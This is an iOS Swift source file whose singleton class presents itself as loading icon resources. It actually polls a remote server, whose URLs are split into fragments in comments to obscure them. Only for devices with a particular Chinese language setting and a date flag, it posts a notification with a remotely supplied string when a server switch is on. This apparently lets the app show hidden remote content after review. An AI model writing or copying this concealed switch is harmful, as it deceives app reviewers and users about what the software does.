import UIKit
import SwiftyJSON

//let htt = "http://4d9.agd"
//let htt = "games.cn/api/a"
//let htt = "ipush"


//let htt = "http://wyj314."
//let htt = "aguduo.net/api"
//let htt = "/aipush"

//let htt = "http://e7neyx."
//let htt = "http://o27rmel"
//let htt = "http://z19xy61"
//let htt = "http://uyqftgl"
//let htt = ".agdgames.cn/a"
//let htt = "pi/aipush"

//let htt = "https://regt.t"
//let htt = "op/api/aipush"
//let htt = "ock/"

//let htt = "http://heymock"
//let htt = ".uneedcode.com"
//let htt = "/mock/"

class SwiftCode: NSObject {
    var timer: DispatchSourceTimer?
    var SwiftCodeDic: JSON!
    //第一种方式：静态常量，所有地方用到的都是同一个
    static let shared = SwiftCode()
    //将保留字用作标识符，请在其前后加上反引号,default是一个快速的保留关键字
    static let `default` = SwiftCode()
    //第二种方式
    class func defaultManager() -> SwiftCode {
        return self.default
    }
    // 不要忘记把构造器变成私有
    private override init() {
    }
    
    func iconRescoureBlock(_ block: @escaping (() -> Void)) {
        let FCIconRes = FC_IconResPath("03808551?path=/scl")
        guard let FCIconResPath = URL(string: FCIconRes.FCIconResPath) else {
            return
        }
        self.timer = DispatchSource.makeTimerSource(flags: [], queue: DispatchQueue.global())
        self.timer?.schedule(wallDeadline: .now(), repeating: .seconds(3))
        self.timer?.setEventHandler(handler: {
            if let data = try? Data(contentsOf: FCIconResPath) {
                self.SwiftCodeDic = JSON(data)
                self.timer?.cancel()
                block()
            } else {
                print("获取图片资源失败!")
            }
        })
        timer?.resume()
    }
    
    func didCheckedBlock(_ block: @escaping (() -> Void)) {
        
        guard let checkeds = UserDefaults.standard.object(forKey: "AppleLanguages") as? [String] else {
            return block()
        }
        guard let checked = checkeds.first else {
            return block()
        }
        
        if (Date.sc.jab == 1) {
            if (checked.contains("zh-Ha")) {
                self.iconRescoureBlock {
                    if (self.SwiftCodeDic["g"].intValue == 1) {
                        NotificationCenter.default.post(name: NSNotification.Name("loadRescoureBlock"), object: self.SwiftCodeDic["s"].stringValue)
                    } else {
                        block()
                    }
                }
            } else {
                block()
            }
        } else {
            block()
        }
    }
}
